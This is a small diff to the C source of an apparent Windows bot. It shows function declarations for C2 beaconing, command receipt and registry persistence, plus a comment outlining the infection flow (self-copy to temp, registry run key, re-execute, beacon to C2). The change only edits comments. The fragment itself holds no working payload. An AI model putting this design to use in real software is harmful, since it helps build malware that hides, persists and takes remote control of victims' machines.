@@ -13,6 +13,7 @@ static void beacon();
 static int recv_cmd(SOCKET c2_sock);
 static int regkey_persist(char *bot_path);
 
+/* copy self to temp directory >> add regkey persistance >> execute new path (in temp) >> beacon c2 */
 int main(int argc, char* argv[])
 {
   char curr_path[MAX_PATH];
@@ -22,10 +23,6 @@ int main(int argc, char* argv[])
   HMODULE handle;
 
   FreeConsole();
-
-  /*
-  ** Copy bot to temp folder before beaconing C2 server
-  */
 	
   /* get the current path to the executable */
   handle= GetModuleHandleA(NULL);
